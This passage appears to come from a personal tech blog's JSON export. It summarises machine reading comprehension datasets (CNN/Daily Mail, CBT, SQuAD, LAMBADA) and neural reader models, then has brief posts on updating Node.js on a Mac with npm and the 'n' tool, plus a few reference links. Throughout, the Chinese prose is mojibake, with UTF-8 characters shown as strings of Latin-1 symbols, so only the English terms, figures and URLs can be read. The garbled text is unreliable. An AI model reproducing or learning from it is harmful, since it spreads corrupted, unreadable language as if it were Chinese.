Mail[9]æ•°æ®é›†æ„å»ºåŸºæœ¬çš„æ€è·¯æ˜¯å—å¯å‘äºè‡ªåŠ¨æ–‡æ‘˜ä»»åŠ¡ï¼Œä»ä¸¤ä¸ªå¤§å‹çš„æ–°é—»ç½‘ç«™CNNå’ŒDaily Mailä¸­è·å–æ•°æ®æºï¼Œç”¨abstractiveçš„æ–¹æ³•ç”Ÿæˆæ¯ç¯‡æ–°é—»çš„summaryï¼Œç”¨æ–°é—»åŸæ–‡ä½œä¸ºdocumentï¼Œå°†summaryä¸­å»æ‰ä¸€ä¸ªentityä½œä¸ºqueryï¼Œè¢«å»æ‰çš„entityä½œä¸ºanswerï¼Œä»è€Œå¾—åˆ°é˜…è¯»ç†è§£çš„æ•°æ®ä¸‰å…ƒç»„(document,query,answer)ã€‚è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æœ‰çš„queryå¹¶ä¸éœ€è¦è”ç³»åˆ°documentï¼Œé€šè¿‡queryä¸­çš„ä¸Šä¸‹æ–‡å°±å¯ä»¥predictå‡ºansweræ˜¯ä»€ä¹ˆï¼Œä¹Ÿå°±å¤±å»äº†é˜…è¯»ç†è§£çš„æ„ä¹‰ã€‚å› æ­¤ï¼Œæœ¬æ–‡æå‡ºäº†ç”¨ä¸€äº›æ ‡è¯†æ›¿æ¢entityå’Œé‡æ–°æ’åˆ—çš„æ–¹æ³•å°†æ•°æ®æ‰“ä¹±ï¼Œé˜²æ­¢ä¸Šé¢ç°è±¡çš„å‡ºç°ã€‚å¤„ç†ä¹‹åçš„æ•ˆæœè§ä¸‹å›¾ï¼š2ã€Childrenâ€™s Book Test(CBT)[3]CBTçš„æ•°æ®å‡æ¥è‡ªProject Gutenbergï¼Œä½¿ç”¨äº†å…¶ä¸­çš„ä¸å­©å­ä»¬ç›¸å…³çš„æ•…äº‹ï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯æ•…äº‹å™è¿°ç»“æ„çš„æ¸…æ™°ï¼Œä»è€Œä½¿å¾—ä¸Šä¸‹æ–‡çš„ä½œç”¨æ›´åŠ çªå‡ºã€‚æ¯ç¯‡æ–‡ç« åªé€‰ç”¨21å¥è¯ï¼Œå‰20å¥ä½œä¸ºdocumentï¼Œå°†ç¬¬21å¥ä¸­å»æ‰ä¸€ä¸ªè¯ä¹‹åä½œä¸ºqueryï¼Œè¢«å»æ‰çš„è¯ä½œä¸ºanswerï¼Œå¹¶ä¸”ç»™å®š10ä¸ªå€™é€‰ç­”æ¡ˆï¼Œæ¯ä¸ªå€™é€‰ç­”æ¡ˆæ˜¯ä»åŸæ–‡ä¸­éšæœºé€‰å–çš„ï¼Œå¹¶ä¸”è¿™10ä¸ªç­”æ¡ˆçš„è¯æ€§æ˜¯ç›¸åŒçš„ï¼Œè¦æ˜¯åè¯éƒ½æ˜¯åè¯ï¼Œè¦æ˜¯å‘½åå®ä½“éƒ½æ˜¯å®ä½“ï¼Œè¦æ˜¯åŠ¨è¯éƒ½æ˜¯åŠ¨è¯ã€‚ä¾‹å­çœ‹ä¸‹å›¾ï¼šå·¦å›¾ä¸ºç”µå­ä¹¦çš„åŸæ–‡ï¼Œå³å›¾ä¸ºæ„å»ºæˆæ•°æ®é›†ä¹‹åçš„å‡ ä¸ªå…ƒç´ ï¼Œdocumentã€queryã€answerå’Œcandidateã€‚æ•°æ®é›†æ ¹æ®è¯æ€§ä¸€å…±åˆ†ä¸ºå››ç±»ï¼Œç¬¬ä¸€ç±»æ˜¯Named Entityï¼Œç¬¬äºŒç±»æ˜¯Nounsï¼Œç¬¬ä¸‰ç±»æ˜¯Verbsï¼Œç¬¬å››ç±»æ˜¯Prepositionã€‚å…¶å®é˜…è¯»ç†è§£é—®é¢˜çš„éš¾åº¦åœ¨äºå‰ä¸¤ç§è¯æ€§ï¼Œåé¢çš„ä¸¤ç§ç”¨è¯­è¨€æ¨¡å‹é€šè¿‡queryçš„ä¸Šä¸‹æ–‡å°±å¯ä»¥é¢„æµ‹å‡ºæ¥ï¼Œä¸éœ€è¦å€ŸåŠ©äºdocumentçš„ä¿¡æ¯ã€‚è¿™ä¸ªæ•°æ®é›†å¹¶æ²¡æœ‰åƒCNNé‚£æ ·åšæ›¿æ¢å’Œé‡æ’çš„å¤„ç†ï¼Œåè€Œæ˜¯é¼“åŠ±å¤§å®¶ç”¨æ›´å°‘çš„ä¿¡æ¯æ¥åšé˜…è¯»ç†è§£ã€‚è¯´å®Œæœ€æµè¡Œçš„ä¸¤ä¸ªæ•°æ®é›†ï¼Œæ¥ä¸‹æ¥ä»‹ç»ä¸€ä¸‹æ˜¨å¤©åˆšåˆšåœ¨arxivä¸Šsubmitçš„ä¸€ä¸ªæ•°æ®é›†ã€‚3ã€Stanford Question Answering Dataset(SQuAD)[1]è¯¥æ•°æ®é›†çš„æ„å»ºåˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼šåœ¨Wikipediaä¸­é€‰å–è´¨é‡æ’ååœ¨10000ä»¥å†…çš„articleï¼Œï¼ˆè¿™é‡Œç”¨äº† Project Nayukiâ€™s Wikipediaâ€™s internal PageRanksæ¥åšrankï¼‰ï¼Œä»æ¯ç¯‡æ–‡ç« ä¸­æå–å‡ºparagraphï¼Œç»è¿‡ä¸€ç³»åˆ—å¤„ç†ä¹‹åå¾—åˆ°äº†23215ä¸ªparagraphï¼Œæ¶‰åŠäº†å¾ˆå®½æ³›çš„è¯é¢˜ã€‚ç„¶åé›‡ä½£äº†crowdworkersç»™æ¯ä¸ªparagraphæé—®å’Œå›ç­”ï¼Œè€Œä¸”é¼“åŠ±workersç”¨è‡ªå·±çš„è¯æ¥æé—®ã€‚ï¼ˆè¿™ä¸€ç‚¹å’ŒCNNä¸­ç”¨abstractiveçš„æ€è·¯å¾ˆåƒï¼Œåªä¸è¿‡æ˜¯ç”¨äº†äººå·¥æ¥åšã€‚ï¼‰ç¬¬ä¸‰æ­¥æ˜¯è®©crowdworkersæ¥ç”¨åŸæ–‡ä¸­çš„textï¼ˆwordæˆ–è€…æ˜¯spanï¼‰æ¥å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå¦‚æœæ— æ³•ç”¨åŸæ–‡å›ç­”çš„è¯ï¼Œç›´æ¥æäº¤é—®é¢˜ã€‚è¿™ä¸ªæ•°æ®é›†çš„ç­”æ¡ˆç±»å‹éå¸¸ä¸°å¯Œï¼Œçœ‹ä¸‹è¡¨ï¼š4ã€LAnguage Modeling Broadened to Account for Discourse Aspects(LAMBADA)[11]è¯¥æ•°æ®é›†çš„paperäº2016å¹´6æœˆ20æ—¥äºarxivä¸Šï¼Œç‰¹è¡¥å……åœ¨æ­¤ã€‚è¿™ä¸ªæ•°æ®é›†çš„æ•°æ®æºæ¥è‡ªBook Corpusï¼Œä¸€å…±åŒ…æ‹¬10022ä¸ªpassageï¼Œå¹³å‡æ¯ä¸ªpassageåŒ…æ‹¬4.6å¥è¯+1å¥targetï¼Œæ¯ä¸ªpassageå¤§çº¦75ä¸ªå•è¯ã€‚åœ¨é€‰æ‹©æ•°æ®çš„è¿‡ç¨‹ç”¨äº†å¾ˆå¤šçš„äººåŠ›æ¥åšï¼ŒæŒ‰ç…§ä»¥ä¸‹çš„è¿‡ç¨‹ï¼šç¬¬ä¸€ä¸ªäººé˜…è¯»å…¨æ–‡ä¹‹åæ¥çŒœtarget wordï¼Œå¦‚æœçŒœå¯¹äº†ã€‚ç¬¬äºŒä¸ªäººç»§ç»­é˜…è¯»å…¨æ–‡æ¥çŒœtarget wordï¼Œå¦‚æœçŒœå¯¹äº†ã€‚æ›´å¤šäººä¸è®©é˜…è¯»å…¨æ–‡ï¼Œåªèƒ½è¯»target sentenceæ¥çŒœtarget wordï¼Œç›´åˆ°çŒœå¯¹æˆ–è€…è¾¾åˆ°çŒœçš„äººæ•°ä¸Šé™ï¼Œæ¯”å¦‚è¯´10.å¦‚æœæ²¡æœ‰äººçŒœçš„å¯¹ï¼Œå°±å°†è¯¥æ•°æ®å½’å…¥LAMBADAä¸­ã€‚è¿™ç§æ–¹æ³•å¾ˆè´¹æ—¶è´¹åŠ›ï¼Œä½†ä»è´¨é‡ä¸Šå¾—åˆ°äº†ä¿è¯ï¼Œæ‰€è·å¾—çš„æ•°æ®é›†éƒ½å¯ä»¥ä¿è¯é€šè¿‡é˜…è¯»å…¨æ–‡ä¹‹åä¸€å®šä¼šå¾—åˆ°æ­£ç¡®ç»“æœï¼Œä¸é˜…è¯»å…¨æ–‡ä¸€å®šæ‰¾ä¸åˆ°ç»“æœï¼Œé¿å…äº†è¯­è¨€æ¨¡å‹é€šè¿‡åˆ†ætarget sentenceç›´æ¥ç”Ÿæˆtarget wordè¿™ç§æƒ…å†µï¼Œç»™ç ”ç©¶è€…æä¾›äº†ä¸€ä¸ªè´¨é‡æ›´é«˜çš„æ•°æ®é›†ã€‚æ¨¡å‹æœ¬æ–‡æ‰€è¯´çš„æ¨¡å‹æ˜¯æŒ‡neuralæ¨¡å‹ï¼Œäººå·¥featuresçš„æ¨¡å‹å°±ä¸ä»‹ç»äº†ã€‚1ã€Deep LSTM Reader / Attentive Reader / Impatient Reader[9]è¿™ä¸ªæ¨¡å‹æ˜¯é…å¥—CNN/Daily Mailæ•°æ®é›†çš„æ¨¡å‹ï¼Œåªæ˜¯ä½œä¸ºåé¢ç ”ç©¶çš„baselineï¼Œæ‰€ä»¥æ•ˆæœä¸ä¼šå¤ªå¥½ã€‚Deep LSTM Readerçœ‹ä¸Šå›¾ï¼Œå…¶å®éå¸¸ç®€å•ï¼Œå°±æ˜¯ç”¨ä¸€ä¸ªä¸¤å±‚LSTMæ¥encode query|||documentæˆ–è€…document|||queryï¼Œç„¶åç”¨å¾—åˆ°çš„è¡¨ç¤ºåšåˆ†ç±»ã€‚Attentive Readerè¿™ä¸ªæ¨¡å‹å°†documentå’Œqueryåˆ†å¼€è¡¨ç¤ºï¼Œå…¶ä¸­queryéƒ¨åˆ†å°±æ˜¯ç”¨äº†ä¸€ä¸ªåŒå‘LSTMæ¥encodeï¼Œç„¶åå°†ä¸¤ä¸ªæ–¹å‘ä¸Šçš„last hidden stateæ‹¼æ¥ä½œä¸ºqueryçš„è¡¨ç¤ºï¼Œdocumentè¿™éƒ¨åˆ†ä¹Ÿæ˜¯ç”¨ä¸€ä¸ªåŒå‘çš„LSTMæ¥encodeï¼Œæ¯ä¸ªtokençš„è¡¨ç¤ºæ˜¯ç”¨ä¸¤ä¸ªæ–¹å‘ä¸Šçš„hidden stateæ‹¼æ¥è€Œæˆï¼Œdocumentçš„è¡¨ç¤ºåˆ™æ˜¯ç”¨documentä¸­æ‰€æœ‰tokençš„åŠ æƒå¹³å‡æ¥è¡¨ç¤ºï¼Œè¿™é‡Œçš„æƒé‡å°±æ˜¯attentionï¼Œæƒé‡è¶Šå¤§è¡¨ç¤ºå›ç­”queryæ—¶å¯¹åº”çš„tokençš„è¶Šé‡è¦ã€‚ç„¶åç”¨documentå’Œqueryçš„è¡¨ç¤ºåšåˆ†ç±»ã€‚Impatient Readerè¿™ä¸ªæ¨¡å‹åœ¨Attentive Readeræ¨¡å‹çš„åŸºç¡€ä¸Šæ›´ç»†äº†ä¸€æ­¥ï¼Œå³æ¯ä¸ªquery tokenéƒ½ä¸document tokensæœ‰å…³è”ï¼Œè€Œä¸æ˜¯åƒä¹‹å‰çš„æ¨¡å‹å°†æ•´ä¸ªqueryè€ƒè™‘ä¸ºæ•´ä½“ã€‚æ„Ÿè§‰è¿™ä¸ªè¿‡ç¨‹å°±å¥½åƒæ˜¯ä½ è¯»queryä¸­çš„æ¯ä¸ªtokenéƒ½éœ€è¦æ‰¾åˆ°documentä¸­å¯¹åº”ç›¸å…³çš„tokenã€‚è¿™ä¸ªæ¨¡å‹æ›´åŠ å¤æ‚ä¸€äº›ï¼Œä½†æ•ˆæœä¸è§å¾—ä¸å¥½ï¼Œä»æˆ‘ä»¬åšé˜…è¯»ç†è§£çš„å®é™…ä½“éªŒæ¥è¯´ï¼Œä½ ä¸å¯èƒ½è¯»é—®é¢˜ä¸­çš„æ¯ä¸€ä¸ªè¯ä¹‹åï¼Œå°±å»è¯»ä¸€éåŸæ–‡ï¼Œè¿™æ ·æ•ˆç‡å¤ªä½äº†ï¼Œè€Œä¸”åŸæ–‡å¾ˆé•¿çš„è¯ï¼Œè®°å¿†çš„æ•ˆæœå°±ä¸ä¼šå¾ˆå¥½äº†ã€‚2ã€Attention Sum Reader[6]step 1 é€šè¿‡ä¸€å±‚Embeddingå±‚å°†documentå’Œqueryä¸­çš„wordåˆ†åˆ«æ˜ å°„æˆå‘é‡ã€‚step 2 ç”¨ä¸€ä¸ªå•å±‚åŒå‘GRUæ¥encode documentï¼Œå¾—åˆ°context representationï¼Œæ¯ä¸ªtime stepçš„æ‹¼æ¥æ¥è¡¨ç¤ºè¯¥è¯ã€‚step 3 ç”¨ä¸€ä¸ªå•å±‚åŒå‘GRUæ¥encode queryï¼Œç”¨ä¸¤ä¸ªæ–¹å‘çš„last stateæ‹¼æ¥æ¥è¡¨ç¤ºqueryã€‚step 4 æ¯ä¸ªword vectorä¸query vectorä½œç‚¹ç§¯åå½’ä¸€åŒ–çš„ç»“æœä½œä¸ºattention weightsï¼Œå°±queryä¸documentä¸­çš„æ¯ä¸ªè¯ä¹‹å‰çš„ç›¸å…³æ€§åº¦é‡ã€‚step 5 æœ€ååšä¸€æ¬¡ç›¸åŒè¯æ¦‚ç‡çš„åˆå¹¶ï¼Œå¾—åˆ°æ¯ä¸ªè¯çš„æ¦‚ç‡ï¼Œæœ€å¤§æ¦‚ç‡çš„é‚£ä¸ªè¯å³ä¸ºanswerã€‚3ã€Memory Networks[3][5]æ¨¡å‹å°†documentä¸­çš„æ¯ä¸€ä¸ªwordä¿å­˜ä¸ºä¸€ä¸ªmemory m(i)ï¼Œæ¯ä¸ªmemoryæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå‘é‡ï¼Œè¿™ä¸€ç‚¹ä¸embeddingæ˜¯ä¸€å›äº‹ï¼Œåªæ˜¯æ¢äº†ä¸€ä¸ªåè¯ã€‚å¦å¤–æ¯ä¸ªwordè¿˜ä¸ä¸€ä¸ªè¾“å‡ºå‘é‡c(i)ç›¸å…³è”ã€‚å¯ä»¥ç†è§£ä¸ºæ¯ä¸ªwordè¡¨ç¤ºä¸ºä¸¤ç»„ä¸åŒçš„embedding Aå’ŒCã€‚åŒæ ·çš„é“ç†ï¼Œqueryä¸­çš„æ¯ä¸ªå•è¯å¯ä»¥ç”¨ä¸€ä¸ªå‘é‡æ¥è¡¨ç¤ºï¼Œå³å¯¹åº”ç€å¦ä¸€ä¸ªembedding Bã€‚åœ¨Input memoryè¡¨ç¤ºå±‚ï¼Œç”¨queryå‘é‡ä¸documentä¸­æ¯ä¸ªå•è¯çš„m(i)ä½œå†…ç§¯ï¼Œå†ç”¨softmaxå½’ä¸€åŒ–å¾—åˆ°ä¸€ç»„æƒé‡ï¼Œè¿™ç»„æƒé‡å°±æ˜¯attentionï¼Œå³queryä¸documentä¸­æ¯ä¸ªwordçš„ç›¸å…³åº¦ï¼Œä¸æ˜¨å¤©çš„AS Readeræ¨¡å‹æœ‰äº›ç±»ä¼¼ã€‚æ¥ä¸‹æ¥ï¼Œå°†æƒé‡ä¸documentä¸­çš„å¦ä¸€ç»„embedding c(i)ä½œåŠ æƒå¹³å‡å¾—åˆ°Output memoryçš„è¡¨ç¤ºã€‚æœ€åï¼Œåˆ©ç”¨queryçš„è¡¨ç¤ºå’Œoutput memoryçš„è¡¨ç¤ºå»é¢„æµ‹answerã€‚ç„¶åï¼Œä»‹ç»ä¸‹å³å›¾çš„å¤šå±‚æ¨¡å‹ã€‚æ ¹æ®å•å±‚æ¨¡å‹çš„ç»“æ„ï¼Œéå¸¸å®¹æ˜“æ„é€ å‡ºå¤šå±‚æ¨¡å‹ã€‚æ¯ä¸€å±‚çš„queryè¡¨ç¤ºç­‰äºä¸Šä¸€å±‚queryè¡¨ç¤ºä¸ä¸Šä¸€å±‚è¾“å‡ºmemoryè¡¨ç¤ºçš„å’Œã€‚æ¯ä¸€å±‚ä¸­çš„Aå’ŒC embeddingæœ‰ä¸¤ç§æ¨¡å¼ï¼Œç¬¬ä¸€ç§æ˜¯é‚»æ¥ï¼Œå³A(k+1) = C(k)ï¼Œä¾æ¬¡é€’æ¨ï¼›ç¬¬äºŒç§æ˜¯ç±»ä¼¼äºRNNä¸­å…±äº«æƒé‡çš„æ¨¡å¼ï¼ŒA(1) = A(2) = â€¦ = A(k),C(1) = C(2) = â€¦ = C(k)ã€‚å…¶ä»–çš„è¿‡ç¨‹å‡å’Œå•å±‚æ¨¡å‹æ— å¼‚ã€‚æœ¬æ–‡æ¨¡å‹çš„ç‰¹ç‚¹æ˜¯æ˜“äºæ„é€ æ›´å¤šå±‚çš„æ¨¡å‹ï¼Œä»è€Œå–å¾—æ›´å¥½çš„æ•ˆæœã€‚åé¢Gate Attention Readeræ¨¡å‹æ­£å¼å€ŸåŠ©äº†è¿™ä¸ªæ€æƒ³ã€‚4ã€Dynamic Entity Representation[7]è®¡ç®—å‡ºentityçš„åŠ¨æ€è¡¨ç¤ºä¹‹åï¼Œé€šè¿‡attention mechanismè®¡ç®—å¾—åˆ°queryä¸æ¯ä¸ªentityä¹‹é—´çš„æƒé‡ï¼Œç„¶åè®¡ç®—æ¯ä¸ªentityåœ¨documentå’Œqueryæ¡ä»¶ä¸‹çš„æ¦‚ç‡ï¼Œæ‰¾åˆ°æœ€ç»ˆçš„answerã€‚queryå‘é‡çš„è®¡ç®—ä¸åŠ¨æ€entityè®¡ç®—è¿‡ç¨‹ç±»ä¼¼ï¼Œè¿™é‡Œéœ€è¦å¡«ç©ºçš„åœ°æ–¹è®°ä½œplaceholderï¼Œä¹Ÿæ˜¯åŒ…æ‹¬å››ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­ä¸¤ä¸ªæ˜¯è¡¨ç¤ºplaceholderä¸Šä¸‹æ–‡çš„last hidden stateï¼Œå¦å¤–ä¸¤ä¸ªæ˜¯è¡¨ç¤ºplaceholderçš„hidden stateã€‚æ¨¡å‹çš„æ•´ä¸ªè®¡ç®—è¿‡ç¨‹å°±æ˜¯è¿™æ ·ã€‚å¦‚æœé‡åˆ°ä¸€ä¸ªentityåœ¨documentä¸­å‡ºç°å¤šæ¬¡çš„æƒ…å†µï¼Œè¯¥entityå°±ä¼šä¼šæœ‰ä¸åŒçš„è¡¨ç¤ºï¼Œæœ¬æ–‡é‡‡ç”¨CNNä¸­å¸¸ç”¨çš„max-poolingä»å„ä¸ªè¡¨ç¤ºä¸­çš„æ¯ä¸ªç»´åº¦è·å–æœ€å¤§çš„é‚£ä¸€ä¸ªç»„æˆè¯¥entityæœ€ç»ˆçš„è¡¨ç¤ºï¼Œè¿™ä¸ªè¡¨ç¤ºåŒ…æ‹¬äº†è¯¥entityåœ¨documentä¸­å„ç§contextä¸‹çš„ä¿¡æ¯ï¼Œå…·æœ‰æœ€å…¨é¢çš„ä¿¡æ¯ï¼Œå³åŸæ–‡ä¸­æ‰€è¯´çš„accumulate informationã€‚å¦‚ä¸‹å›¾ï¼š5ã€Gate Attention Reader[8]step 1 documentå’Œqueryé€šè¿‡ä¸€ä¸ªLookupå±‚ï¼Œä½¿å¾—æ¯ä¸ªè¯éƒ½è¡¨ç¤ºæˆä¸€ä¸ªä½ç»´å‘é‡ã€‚step 2 å°†documentä¸­çš„è¯å‘é‡é€šè¿‡ä¸€ä¸ªåŒå‘GRUï¼Œå°†ä¸¤ä¸ªæ–¹å‘çš„stateåšæ‹¼æ¥è·å¾—è¯¥è¯çš„æ–°è¡¨ç¤ºã€‚åŒæ—¶ä¹Ÿå°†queryé€šè¿‡ä¸€ä¸ªåŒå‘GRUï¼Œç”¨ä¸¤ä¸ªæ–¹å‘ä¸Šçš„last hidden stateä½œä¸ºqueryçš„è¡¨ç¤ºã€‚step 3 å°†documentä¸­æ¯ä¸ªè¯çš„æ–°è¡¨ç¤ºä¸queryçš„æ–°è¡¨ç¤ºé€å…ƒç´ ç›¸ä¹˜å¾—åˆ°ä¸‹ä¸€ä¸ªGRUå±‚çš„è¾“å…¥ã€‚step 4 é‡å¤step 2å’Œ3ï¼Œç›´åˆ°é€šè¿‡è®¾å®šçš„Kå±‚ï¼Œåœ¨ç¬¬Kå±‚æ—¶ï¼Œdocumentçš„æ¯ä¸ªè¯å‘é‡ä¸queryå‘é‡åšå†…ç§¯ï¼Œå¾—åˆ°ä¸€ä¸ªæœ€ç»ˆçš„å‘é‡ã€‚step 5 å°†è¯¥å‘é‡è¾“å…¥åˆ°softmaxå±‚ä¸­ï¼Œåšæ¦‚ç‡å½’ä¸€åŒ–ã€‚step 6 å› ä¸ºdocumentä¸­æœ‰é‡å¤å‡ºç°çš„è¯ï¼Œèšåˆä¹‹åå¾—åˆ°æœ€ç»ˆçš„åˆ†ç±»ç»“æœï¼Œå³ç¡®å®šåº”è¯¥å¡«å“ªä¸ªè¯ã€‚6ã€Iterative Alternating Attention[2]step 1 å°†documentå’Œqueryé€šè¿‡ä¸€ä¸ªLookupå±‚ï¼Œä½¿å¾—æ¯ä¸ªè¯éƒ½è¡¨ç¤ºæˆä¸€ä¸ªä½ç»´å‘é‡ã€‚step 2 å°†documentå’Œqueryä¸­çš„è¯å‘é‡é€šè¿‡ä¸€ä¸ªåŒå‘GRUï¼Œå°†ä¸¤ä¸ªæ–¹å‘çš„stateæ‹¼æ¥è·å¾—è¯¥è¯çš„æ–°è¡¨ç¤ºã€‚step 3 è¿™ä¸€æ­¥æ–‡ç« ä¸­ç§°ä¸ºIterative Alternating Attentionï¼Œ1ï¼‰æ ¹æ®å‰ä¸€ä¸ªinferenceçŠ¶æ€s(t-1)æ¥è®¡ç®—queryçš„attentionï¼Œå¾—åˆ°query glimpse q(t)ï¼Œå¯¹åº”å›¾ä¸­çš„1;2)æ ¹æ®å‰ä¸€ä¸ªçŠ¶æ€s(t-1)å’Œå½“å‰çš„query glimpse q(t)æ¥è®¡ç®—documentçš„attentionï¼Œå¾—åˆ°document glimpse d(t)ï¼Œå¯¹åº”å›¾ä¸­çš„2ï¼›3)ç”¨GRUæ¥å°†å‰ä¸€ä¸ªçŠ¶æ€s(t-1)å’Œå½“å‰çš„query glimpse q(t)å’Œå½“å‰çš„document glimpse d(t)åšå¤„ç†å¾—åˆ°å½“å‰çš„çŠ¶æ€s(t)ã€‚step 4 é‡å¤step 3 ç›´åˆ°tè¾¾åˆ°ç»™å®šçš„Tä¸ºæ­¢ã€‚step 5 ç”¨æœ€åå¾—åˆ°çš„æ¯ä¸ªè¯å‘é‡è¿›è¡Œå½’ä¸€åŒ–ï¼Œå¹¶ä¸”èšåˆç›¸åŒçš„è¯æ¦‚ç‡ï¼Œå¾—åˆ°é¢„æµ‹ç»“æœã€‚ç»“æœæ‰€æœ‰æ¨¡å‹éƒ½æ˜¯åœ¨ä¸¤å¤§ä¸»æµæ•°æ®é›†ä¸Šè¿›è¡Œå¯¹æ¯”[2][8]ï¼Œç»“æœå¦‚ä¸‹ï¼šMaluubaå…¬å¸çš„æ¨¡å‹åœ¨CBTæ•°æ®é›†ä¸Šæ˜¯æœ€å¥½çš„ï¼Œåœ¨CNN/Daily Mailæ•°æ®é›†ä¸Šå¹¶æ²¡æœ‰æœ€æµ‹è¯•ï¼Œè€ŒGate Attention Readerå æ®äº†CNNæ•°æ®é›†ä¸Šçš„å¤´æŠŠäº¤æ¤…ã€‚model ensembleå¯ä»¥å°†single modelçš„æ•ˆæœæå‡å¾ˆå¤šï¼Œæ˜¯ä¸€ç§éå¸¸æœ‰æ•ˆçš„æŠ€æœ¯ã€‚ä»ç¬¬ä¸€ä¸ªæ¨¡å‹Attentive Readeråˆ°æœ€åä¸€ä¸ªæ¨¡å‹Iterative Alternating Attentionæ—¶é—´è·¨åº¦å¤§æ¦‚æ˜¯åŠå¹´å·¦å³çš„æ—¶é—´ï¼Œé˜…è¯»ç†è§£çš„æ­£ç¡®ç‡æå‡äº†è¿‘20ä¸ªç™¾åˆ†ç‚¹ã€‚CBTæ•°æ®é›†ä¸ŠåŒ…å«äº†äººå·¥æµ‹è¯•çš„ç»“æœï¼Œæœ€é«˜çš„å‡†ç¡®ç‡ä¸º81.6%ï¼Œè€Œç›®å‰è®¡ç®—æœºå¯ä»¥è¾¾åˆ°çš„æœ€é«˜æ­£ç¡®ç‡æ˜¯72%ï¼Œç¦»äººç±»ä»æœ‰ä¸å°çš„å·®è·ï¼Œéœ€è¦æ›´å¤šæ›´ç‰›çš„modelæ¶Œç°å‡ºæ¥ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"ç¥ç»ç½‘ç»œ","slug":"ç¥ç»ç½‘ç»œ","permalink":"https://wangxiuwen.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"}],"author":"baipeng"},{"title":"macä¸‹nodejs æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬çš„æœ€æ–°æ–¹æ³•","slug":"history/tech/59e9652666a84c463d4416d1","date":"2017-10-20T02:53:26.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59e9652666a84c463d4416d1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59e9652666a84c463d4416d1/","excerpt":"","text":"macä¸‹nodejs æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬çš„æœ€æ–°æ–¹æ³•å‰ææ¡ä»¶macä¸Šå®‰è£…äº†npmç¬¬ä¸€æ­¥ï¼šä½¿ç”¨npmå®‰è£…næ¨¡å—næ¨¡å—æ˜¯ä¸“é—¨ç”¨æ¥ç®¡ç†nodejsç‰ˆæœ¬çš„sudo npm install -g n1 æç¤º : å¦‚æœä¸ä½¿ç”¨sudoä½œä¸ºå‰ç¼€ï¼Œå¾ˆå¯èƒ½å‡ºç°æƒé™è®¿é—®å¼‚å¸¸å¯¼è‡´å®‰è£…å¤±è´¥ç¬¬äºŒæ­¥ï¼šå‡çº§nodejså‡çº§nodejsæ˜¯æœ‰ä¸¤ç§æ–¹æ³•ï¼šç¬¬ä¸€ç§æ˜¯å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬sudo n latest1ç¬¬äºŒç§æ˜¯å‡çº§åˆ°ç¨³å®šç‰ˆæœ¬sudo n stable1æç¤º : å»ºè®®æ˜¯ç¨³å®šç‰ˆæœ¬","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"è¿ç§»å­¦ä¹ èµ„æ–™","slug":"history/tech/59e9bb1a66a84c463d4416d2","date":"2017-10-19T21:00:10.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59e9bb1a66a84c463d4416d2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59e9bb1a66a84c463d4416d2/","excerpt":"","text":"http://www.cse.ust.hk/TL/index.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç”µå­è®¾è®¡ä»é›¶å¼€å§‹","slug":"history/tech/59e5b61d66a84c463d4416d0","date":"2017-10-16T19:49:49.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59e5b61d66a84c463d4416d0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59e5b61d66a84c463d4416d0/","excerpt":"","text":"å®˜ç½‘http://www.circuitfly.com/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è‰²å½©","slug":"history/ui/59e37b8466a84c463d4416cf","date":"2017-10-15T03:15:16.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/59e37b8466a84c463d4416cf/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/59e37b8466a84c463d4416cf/","excerpt":"","text":"åç»­å­¦ä¹ ï¼šè‰²å½©åƒç´  è‰²å½©æ€§æ ¼ è‰²ç›¸ç¯ 